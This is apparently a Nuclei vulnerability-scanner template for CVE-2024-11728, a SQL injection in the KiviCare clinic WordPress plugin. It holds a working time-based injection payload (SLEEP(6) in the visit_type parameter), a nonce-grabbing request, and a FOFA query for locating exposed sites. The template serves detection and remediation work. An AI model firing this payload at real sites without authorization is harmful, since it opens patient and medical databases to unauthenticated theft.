flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    regex:
    - ajax_post_nonce:\s*'([^']+)'
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - /wp-content/plugins/kivicare-clinic-management-system
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>6
    - contains_all(body, "status", "message", "total_tax")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - '@timeout 20s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=ajax_post&route_name=tax_calculated_data&clinic_id[id]=1&doctor_id[id]=1&visit_type[0][service_id]=123)
    AND (SELECT * FROM (SELECT(SLEEP(6)))alias) AND (1=1&_ajax_nonce={{nonce}}

    '
id: CVE-2024-11728
info:
  author: samogod,s4e-io
  classification:
    cve-id: CVE-2024-11728
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.98153
    epss-score: 0.59498
  description: 'The KiviCare Clinic & Patient Management System (EHR) plugin for WordPress
    is vulnerable to SQL Injection via the ''visit_type[service_id]'' parameter of
    the tax_calculated_data AJAX action in all versions up to, and including, 3.6.4
    due to insufficient escaping on the user supplied parameter and lack of sufficient
    preparation on the existing SQL query. This makes it possible for unauthenticated
    attackers to append additional SQL queries into already existing queries that
    can be used to extract sensitive information from the database.

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection through
    the visit_type parameter in the tax_calculated_data action to extract the complete
    clinic database including patient records, medical history, and appointment data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/kivicare-clinic-management-system"
    framework: wordpress
    max-request: 2
    product: kivicare
    vendor: iqonic
    verified: true
  name: KiviCare Clinic & Patient Management System (EHR) <= 3.6.4 - SQL Injection
  reference:
  - https://github.com/samogod/CVE-2024-11728
  - https://samogod.com/2024/12/11/cve-2024-11728-kivicare-wordpress-unauthenticated-sql-injection/
  - https://plugins.trac.wordpress.org/changeset/3201428/kivicare-clinic-management-system/trunk/app/controllers/KCTaxController.php
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/53c18834-3026-4d4d-888b-add314a0e56e?source=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2024-11728
  remediation: 'To remediate this vulnerability, validate and sanitize all user inputs
    on the server side before using them in SQL queries. Use prepared statements or
    stored procedures, and ensure that data is properly escaped.

    '
  severity: high
  tags: cve,cve2024,wp,wordpress,wp-plugin,sqli,kivicare-clinic-management-system,vuln
